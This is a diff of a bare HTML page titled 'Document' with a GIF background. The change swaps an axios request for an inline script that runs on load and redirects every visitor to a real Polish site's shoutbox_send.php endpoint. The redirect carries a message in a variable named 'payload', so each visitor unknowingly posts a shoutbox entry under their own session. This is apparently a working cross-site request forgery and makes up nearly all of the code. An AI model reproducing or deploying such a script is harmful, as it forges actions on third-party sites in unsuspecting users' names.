@@ -4,33 +4,19 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <title>Document</title>
     <style>
         body {
             background-image: url("./image.gif");
         }
     </style>
-</head>
+    </head>
 <body>
-    
-    
 <script>
     (async () => {
-        try {
-            
-            const url = "https://brygadagraczy.pl/";
-            const response = await axios.get(url, {
-                headers: {
-	                'Access-Control-Allow-Origin': '*',
-	            },
-            });
-            console.log(response);
-            
-        } catch (e) {
-            console.log(e);
-        }
-        
+        const msg = "Co tam u was?";
+        const payload = `https://brygadagraczy.pl/modules/shoutbox/shoutbox_send.php?msg=${msg}`;
+        window.location.href = payload
     })();
 </script>
 </body>
